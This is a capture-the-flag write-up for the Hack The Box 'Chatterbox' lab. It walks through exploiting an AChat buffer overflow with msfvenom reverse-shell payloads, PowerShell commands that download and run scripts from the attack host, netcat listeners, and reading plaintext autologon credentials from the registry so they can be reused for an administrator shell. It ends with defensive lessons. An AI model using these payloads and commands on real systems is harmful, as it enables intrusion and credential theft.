# Chatterbox Writeup w/o Metasploit

![](https://miro.medium.com/max/597/1*9HpPZa8NMVpxMHQTxybI6g.png)

## Reconnaissance <a id="8cb6"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.74 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.74
                                                                                                                                                       
                                                                                                                                                       
---------------------Starting Nmap Quick Scan---------------------                                                                                     
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:27 ESTroot@kali:~/Desktop/htb/chatterbox# rm -r 10.10.10.74/
root@kali:~/Desktop/htb/chatterbox# nmapAutomator.sh 10.10.10.74 AllRunning all scans on 10.10.10.74
                                                                                                                                                       
Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:31 EST
Nmap done: 1 IP address (1 host up) scanned in 101.53 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                       
No ports in quick scan.. Skipping!
                                                                                                                                                       
                                                                                                                                                       
                                                                                                                                                       
----------------------Starting Nmap UDP Scan----------------------                                                                                     
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:33 EST
Nmap scan report for 10.10.10.74
Host is up.
All 1000 scanned ports on 10.10.10.74 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.64 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:36 EST
Initiating Parallel DNS resolution of 1 host. at 22:36
Completed Parallel DNS resolution of 1 host. at 22:36, 0.12s elapsed
Initiating SYN Stealth Scan at 22:36
Scanning 10.10.10.74 [65535 ports]
Nmap scan report for 10.10.10.74
Host is up (0.043s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
9256/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27674.79 seconds
           Raw packets sent: 131092 (5.768MB) | Rcvd: 148 (11.472KB)Making a script scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.042s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat systemService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                       
Running CVE scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.035s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat systemService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 secondsRunning Vuln scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.039s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat system
|_clamav-exec: ERROR: Script execution failed (use -d to debug)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds---------------------Finished all Nmap scans---------------------
```

We have one port open.

* **Port 9256**: ****running AChat chat system

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 9256 is running some kind of chat system that I’m not familiar with, so the first we’ll do is google it to figure out what it is. Then we’ll run searchsploit on it to see if it is associated to any known vulnerabilities.

## Enumeration <a id="ad33"></a>

Doing a quick google search on the service tells us that AChat is a software that enables you to chat on your local network. It can also be used to share and send files/images to other users.

Now that we know what it is, let’s run searchsploit on it.

![](https://miro.medium.com/max/1174/1*-bEFqyrr_dYyPmeSzTn68A.png)

It’s vulnerable to a remote buffer overflow and there is both apython and metasploit exploit for it. We will of course work with the non-metasploit solution.

Copy the python script to your current directory.

```text
searchsploit -m 36025
```

Looking at the exploit code we make note of the following things:

* It looks like your classic stack buffer overflow that allows you to overflow the buffer and include malicious shell code that will get executed on the box.
* The exploit author was nice enough to give us the msfvenom command that generates the malicious payload \(_‘buf’_ variable\) including the bad characters to avoid. This makes our life so much easier! The command simply spawns the _calc.exe_ program on the target machine. So we’ll have to change the command to send a reverse shell back to our attack machine.
* We also need to change the _server\_address_ to that of the IP address of Chatterbox.
* There seems to be a length limit of 1152 bytes on the payload. Anything that exceeds that will probably not work. We’ll keep that in mind when using msfvenom to generate our reverse shell.

## Initial Foothold <a id="c189"></a>

Use msfvenom to generate the reverse shell payload.

```text
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We get back the following result.

```text
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
......[truncated]
```

The payload size is 774 bytes, so within the limit. Copy the payload and add it in place of the payload included in the exploit. Also change the IP address to Chatterbox’s IP address.

```text
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)
```

Then setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Run the exploit.

```text
root@kali:~/Desktop/htb/chatterbox# python 36025.py 
---->{P00F}!
```

We get a shell!

![](https://miro.medium.com/max/882/1*XK-pIFAJyBDZVuw7RA4MSQ.png)

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/611/1*AxvyV0VE64vlTeih-UKZIA.png)

We’re running as a low privileged user, so we’ll need to escalate privileges.

## Privilege Escalation <a id="ff1c"></a>

Display the user account information.

![](https://miro.medium.com/max/609/1*pLWQwPKFiIv4iXor0MDgFg.png)

Next, view all the users on the system.

![](https://miro.medium.com/max/847/1*FN02_FJZDN_YRYV1aOoL8A.png)

We have three users. The user we want to compromise is the _Administrator_ account.

Next, let’s check the system privileges that are enabled for the _Alfred_ user.

![](https://miro.medium.com/max/1121/1*AY1Fl2DcrI9awi36T9HAiA.png)

_SetImpersonatePrivilege_ is not enabled so we can’t use the [Juicy Potato](https://github.com/ohpe/juicy-potato) exploit to escalate privileges.

Run the _systeminfo_ command.

![](https://miro.medium.com/max/731/1*4AAvQEZjyYtSnMdNPGmCpQ.png)

The box has 208 hotfixes installed so it’s unlikely that we can escalate privileges using a kernel exploit \(although it might be possible, I haven’t checked\).

Let’s see if we have access to the _Administrator_ directory.

![](https://miro.medium.com/max/570/1*a-mG45BDsR8lCDFPA3F2Rg.png)

We do. That’s odd. Let’s try and view the _root.txt_ flag.

![](https://miro.medium.com/max/544/1*qutamKZ9EZ4eniFYXdOn2Q.png)

We don’t have permission. View the permissions on the _root.txt_ file.

![](https://miro.medium.com/max/658/1*Io9LZSrwpeVl5r86ZbLR9Q.png)

Only _Administrator_ has full access \(F\) on this file. Let’s view the permissions on the _Desktop_ directory. We must have some kind of permission on it because we’re able to enter it.

![](https://miro.medium.com/max/681/1*8FN10LxJCfJHt2nDF_lwrw.png)

We have full access \(F\) on the _Desktop_ directory. The Alfred user is also configured to own the _root.txt_ file.

![](https://miro.medium.com/max/781/1*RB_nedflS2Jh2bnGom60fQ.png)

So we can simply grant ourselves access to it using the following command.

![](https://miro.medium.com/max/758/1*s6zsv0MsAAp0sp3n7NlOUA.png)

View the permissions again to confirm that the change was made.

![](https://miro.medium.com/max/649/1*YJVoWD189gUyAnYoOtuTjQ.png)

Perfect! We should now be able to view the _root.txt_ flag.

![](https://miro.medium.com/max/567/1*5AV9M9Ls6XTQ2SO-gkwbAQ.png)

Alright, all we did is view the root flag, we didn’t really escalate privileges. Unfortunately our shell can’t handle running PowerShell, so in the next section, we’ll start from the beginning and send a PowerShell reverse shell back to our target machine and from there we’ll escalate our privileges to _Administrator_.

## Extra Content: The PowerShell Solution <a id="e858"></a>

View the options for PowerShell reverse shells in msfvenom.

![](https://miro.medium.com/max/1385/1*HLwepNg6SyWiuGIPICQGVA.png)

We’ll go with the _powershell\_reverse\_tcp_ option.

```text
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Unfortunately, this gives us a payload that is larger than the maximum size specified in the exploit.

![](https://miro.medium.com/max/1421/1*R2cIHjSY_Wf1ANRH_2L_UQ.png)

So instead, we’ll just use the _windows/exec_ module to download and execute the [Nishang](https://github.com/samratashok/nishang) reverse shell.

Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, use msfvenom to generate a payload that downloads the PowerShell script and executes it.

```text
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We get back the following result.

```text
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 684 (iteration=0)
x86/unicode_mixed chosen with final size 684
Payload size: 684 bytes
Final size of python file: 3330 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
.....[redacted]
```

Good! The payload size is 684 bytes, so it’s within the limit. Copy the payload and add it in place of the payload included in the exploit.

Start up a python server in the directory that the PowerShell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Run the exploit.

```text
root@kali:~/Desktop/htb/chatterbox# python 36025.py 
---->{P00F}!
```

We get a PowerShell shell!

![](https://miro.medium.com/max/943/1*BqwL-qWlNezkn5G9g4eKFw.png)

We’ll use the [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) script to determine if there are any misconfigurations that lead to privilege escalation.

Upload and run the script on the target machine.

```text
PS C:\Users\Alfred\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/PowerUp.ps1')PS C:\Users\Alfred\Desktop> Invoke-AllChecks
```

We get back two interesting results.

```text
[*] Checking for Autologon credentials in registry...DefaultDomainName    : 
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   :[*] Checking for unattended install files...UnattendPath : C:\Windows\Panther\Unattend.xml
```

Viewing the _Unattend.xml_ file, we see that the password was redacted. So let’s focus on the Autologon credentials. The default username is “_Alfred_” and the default password is “_Welcome1!_”. I don’t have much experience with Windows, so I googled [Autologin credentials](https://support.microsoft.com/en-ca/help/324737/how-to-turn-on-automatic-logon-in-windows) to learn more about it.

![](https://miro.medium.com/max/1148/1*oR22IbW1Do-rN8XOfFjtjQ.png)

As stated in the article, these credentials are stored in the registry in plain text. The manual commands for extracting these credentials are:

```text
PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName                                                                                                                         
Alfred                                                                                                                                               PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword                                                                                                                         
Welcome1!
```

These credentials are set by the administrator. Since users have a tendency to reuse passwords, let’s see if the administrator account is set to the same password.

To do that, first run the following command to convert the plain text string “_Welcome1!_” into a secure string and store the result in the _$password_ variable.

```text
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
```

* **ConvertTo-SecureString**: Converts plain text to secure strings.
* **-AsPlainText**: Specifies a plain text string to convert to a secure string.
* **-Force**: Confirms that you understand the implications of using the _AsPlainText_ parameter and still want to use it.

Second, create a new object to store these credentials.

```text
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
```

Third, we’ll use these credentials to start PowerShell and send a \(hopefully privileged\) reverse shell back to our attack machine.

In the attack machine, copy the _shell.ps1_ script we used earlier and save it in the file _shell-admin.ps1_.

```text
cp shell.ps1 shell-admin.ps1
```

Change _shell-admin.ps1_ to send a reverse shell to our attack machine on port 6666.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
```

Setup a python server in the directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

Setup a listener to receive the reverse shell.

```text
nc -nlvp 6666
```

On the target machine, use the credentials to start PowerShell to download the _shell-admin.ps1_ script, run it and send a reverse shell back to our attack machine.

```text
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:5555/shell-admin.ps1')" -Credential $cred
```

We get a shell with administrator privileges!

![](https://miro.medium.com/max/767/1*FzEuxFT88c3h8BlJVEsEVg.png)

Now we can view the _root.txt_ flag without having to change the ACL permissions on it.

![](https://miro.medium.com/max/785/1*Bf2Jui2BxcVzj2W4SI-wIg.png)

## Lessons Learned <a id="a720"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Buffer Overflow vulnerability. The AChat chat service being used was vulnerable to a known remote buffer overflow vulnerability. This allowed us to execute shell code on the box and send a reverse shell back to our attack machine. Since this is a known vulnerability, the administrator should have used the patched version of AChat or completely disabled the service if a patch is not available.

To escalate privileges we exploited three vulnerabilities.

1. Security misconfiguration. The _Alfred_ user had full access on the _Administrator_ directory and owned the _root.txt_ file. Although we weren’t initially able to view the _root.txt_ file, we did own it so we simply granted ourselves access to view the file. The administrator should have conformed to the principle of least privilege when setting up user permissions.
2. Automatic logon credentials saved in plaintext. Again, I’m not too familiar with the Windows system, but it seems like there is an option to store [automatic logon credentials in encrypted form](https://docs.microsoft.com/en-us/windows/win32/secauthn/protecting-the-automatic-logon-password). This way, as a non-privileged user we wouldn’t have been able to access these credentials.
3. Reuse of credentials. The administrator had setup his password to be the same as the password used for automatic logon. Since these credentials are saved in cleartext in the registry, we were able to view them and start up a PowerShell process that sent a privileged reverse shell back to our attack machine in the context of the Administrator user. It goes without saying that you should definitely not reuse credentials, especially when setting up a non-privileged account where the credentials will be stored in plaintext.

